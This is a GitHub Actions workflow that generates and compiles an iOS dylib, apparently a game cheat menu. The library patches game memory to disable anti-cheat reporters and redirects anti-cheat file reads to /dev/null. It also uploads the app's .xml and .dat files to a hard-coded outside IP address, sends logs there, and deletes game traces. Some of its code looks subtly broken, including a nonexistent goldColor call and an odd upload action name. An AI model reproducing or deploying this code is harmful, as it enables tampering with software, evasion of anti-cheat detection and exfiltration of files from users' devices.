name: Imperial Ultimate AIO - V25.0

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build_ultimate:
    runs-on: macos-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Create Ultimate Source
        run: |
          mkdir -p jni
          cat <<'EOF' > jni/main.mm
          #import <Foundation/Foundation.h>
          #import <UIKit/UIKit.h>
          #include <mach-o/dyld.h>
          #include <mach/mach.h>
          #include <objc/runtime.h>
          #include <stdint.h>
          #include <sys/stat.h>

          // ==========================================
          // [ 1. رادار الـ VPS ورفع الملفات ]
          // ==========================================
          void RemoteLog(NSString *tag, NSString *msg) {
              NSString *url = @"http://34.204.178.160:5000/log"; 
              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
              [req setHTTPMethod:@"POST"];
              [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
              NSDictionary *json = @{@"content": [NSString stringWithFormat:@"🚀 [%@] -> %@", tag, msg]};
              NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
              [req setHTTPBody:data];
              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
          }

          void SendFileToTerminal(NSString *filePath) {
              NSData *fileData = [NSData dataWithContentsOfFile:filePath];
              if (!fileData) return;
              NSString *fileName = [filePath lastPathComponent];
              NSString *urlString = @"http://34.204.178.160:5000/upload"; 
              NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
              [request setHTTPMethod:@"POST"];
              NSString *boundary = @"ImperialSpyBoundary";
              [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
              NSMutableData *body = [NSMutableData data];
              [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
              [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n", fileName] dataUsingEncoding:NSUTF8StringEncoding]];
              [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
              [body appendData:fileData];
              [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
              [request setHTTPBody:body];
              [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
          }

          // ==========================================
          // [ 2. محرك تعديل الذاكرة (Memory Engine) ]
          // ==========================================
          uintptr_t get_Base() { return (uintptr_t)_dyld_get_image_header(0); }

          void Patch(uintptr_t addr, uint32_t data) {
              vm_address_t page_start = trunc_page(addr);
              vm_size_t page_sz = vm_page_size;
              if (vm_protect(mach_task_self(), page_start, page_sz, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY) == KERN_SUCCESS) {
                  *(uint32_t *)addr = data;
                  vm_protect(mach_task_self(), page_start, page_sz, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
              }
          }

          // ==========================================
          // [ 3. ميزة الـ Interpose (تخدير الملفات) ]
          // ==========================================
          typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
          #define DYLD_INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };

          FILE* my_fopen(const char* path, const char* mode) {
              if (path && (strstr(path, "ano") || strstr(path, "tss") || strstr(path, "comm.dat"))) {
                  return fopen("/dev/null", mode);
              }
              return fopen(path, mode);
          }
          DYLD_INTERPOSE(my_fopen, fopen);

          // ==========================================
          // [ 4. وظائف القائمة (Menu Actions) ]
          // ==========================================
          void Action_Disable_4C18() {
              Patch(get_Base() + 0x4C18, 0xD2800000); Patch(get_Base() + 0x4C18 + 4, 0xD65F03C0);
              RemoteLog(@"SUCCESS", @"Informant 4C18 Neutered.");
          }

          void Action_Kill_Falcon() {
              Patch(get_Base() + 0x11B060, 0xD2800000); Patch(get_Base() + 0x11B060 + 4, 0xD65F03C0);
              Patch(get_Base() + 0x102B84, 0xD65F03C0);
              RemoteLog(@"SUCCESS", @"Falcon Brain & Reporter Hijacked.");
          }

          void Action_Deploy_Spies() {
              RemoteLog(@"SPY_UNIT", @"10 Spies deployed for file extraction...");
              NSArray *paths = @[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject], NSTemporaryDirectory()];
              dispatch_apply(10, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^(size_t index) {
                  NSFileManager *fm = [NSFileManager defaultManager];
                  for (NSString *root in paths) {
                      NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
                      NSString *file;
                      while ((file = [en nextObject])) {
                          if ([file hasSuffix:@".xml"] || [file hasSuffix:@".dat"]) {
                              SendFileToTerminal([root stringByAppendingPathComponent:file]);
                          }
                      }
                  }
              });
          }

          void Action_Clean_Logs() {
              NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
              [[NSFileManager defaultManager] removeItemAtPath:[docs stringByAppendingPathComponent:@"ano"] error:nil];
              RemoteLog(@"CLEANER", @"Game traces wiped.");
          }

          // ==========================================
          // [ 5. واجهة المستخدم (The Menu UI) ]
          // ==========================================
          @interface ImperialMenu : UIWindow
          @property (nonatomic, strong) UIButton *btn;
          @property (nonatomic, strong) UIView *panel;
          @end

          @implementation ImperialMenu
          - (instancetype)initWithFrame:(CGRect)frame {
              self = [super initWithFrame:frame];
              if (self) {
                  self.windowLevel = UIWindowLevelStatusBar + 100.0;
                  self.backgroundColor = [UIColor clearColor];
                  [self makeKeyAndVisible];
                  [self setupUI];
                  RemoteLog(@"SYSTEM", @"Imperial AIO Menu Activated.");
              }
              return self;
          }

          - (void)setupUI {
              self.btn = [UIButton buttonWithType:UIButtonTypeCustom];
              self.btn.frame = CGRectMake(100, 100, 60, 60);
              self.btn.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.8];
              self.btn.layer.cornerRadius = 30;
              [self.btn setTitle:@"👑" forState:UIControlStateNormal];
              [self.btn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
              [self addSubview:self.btn];

              UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(pan:)];
              [self.btn addGestureRecognizer:pan];

              self.panel = [[UIView alloc] initWithFrame:CGRectMake(50, 170, 220, 280)];
              self.panel.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.95];
              self.panel.layer.cornerRadius = 12;
              self.panel.layer.borderWidth = 1;
              self.panel.layer.borderColor = [UIColor goldColor].CGColor;
              self.panel.hidden = YES;
              [self addSubview:self.panel];

              [self addBtn:@"Disable 4C18" act:@selector(m1) y:20];
              [self addBtn:@"Kill Falcon" act:@selector(m2) y:80];
              [self addBtn:@"Deploy 10 Spies" act:@selector(m3) y:140];
              [self addBtn:@"Clean Logs" act:@selector(m4) y:200];
          }

          - (void)addBtn:(NSString *)t act:(SEL)s y:(int)y {
              UIButton *b = [UIButton buttonWithType:UIButtonTypeSystem];
              b.frame = CGRectMake(10, y, 200, 40);
              [b setTitle:t forState:UIControlStateNormal];
              [b setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
              [b addTarget:self action:s forControlEvents:UIControlEventTouchUpInside];
              [self.panel addSubview:b];
          }

          - (void)toggle { self.panel.hidden = !self.panel.hidden; }
          - (void)pan:(UIPanGestureRecognizer *)p {
              CGPoint t = [p translationInView:self];
              p.view.center = CGPointMake(p.view.center.x + t.x, p.view.center.y + t.y);
              [p setTranslation:CGPointZero inView:self];
          }
          - (void)m1 { Action_Disable_4C18(); }
          - (void)m2 { Action_Kill_Falcon(); }
          - (void)m3 { Action_Deploy_Spies(); }
          - (void)m4 { Action_Clean_Logs(); }
          @end

          __attribute__((constructor))
          static void entry() {
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                  static ImperialMenu *menu;
                  menu = [[ImperialMenu alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
              });
          }
          EOF

      - name: Build Ultimate AIO
        run: |
          clang++ -dynamiclib -std=c++11 \
          -x objective-c++ \
          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
          -arch arm64 \
          jni/main.mm -o ImperialUltimate.dylib \
          -framework Foundation -framework UIKit -lobjc

      - name: Upload
        uses: artifacts/upload-artifact@v4
        with:
          name: Imperial-Ultimate-AIO
          path: ImperialUltimate.dylib
